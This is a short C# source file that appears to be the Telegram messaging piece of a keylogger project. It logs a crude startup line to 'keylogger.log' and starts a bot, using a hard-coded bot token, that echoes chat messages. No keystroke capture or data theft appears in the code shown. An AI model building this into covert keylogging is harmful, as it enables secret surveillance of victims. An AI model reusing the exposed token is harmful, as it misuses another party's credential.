using System;
using System.IO;
using System.Net;
using Telegram.Bot;
using Telegram.Bot.Args;

namespace OperLog
{
    class Sender
    {
        static ITelegramBotClient botClient;

        public static void SendBot()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            File.AppendAllText("keylogger.log", "Запустился сука");
            botClient = new TelegramBotClient("1390500172:AAGZpceToZXEFcj1cAu7emYqp9APgKroxBw");
            var me = botClient.GetMeAsync().Result;
            botClient.OnMessage += Bot_OnMessage;
            botClient.StartReceiving();

            //Console.WriteLine("Press any key to exit");
            //Console.ReadKey();

            //botClient.StopReceiving();
        }
        public static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {
            if (e.Message.Text != null)
            {
                // Console.WriteLine($"Received a text message in chat {e.Message.Chat.Id}.");

                await botClient.SendTextMessageAsync(
                  chatId: e.Message.Chat,
                  text: "You said:\n" + e.Message.Text
                );
            }
        }
    }
}
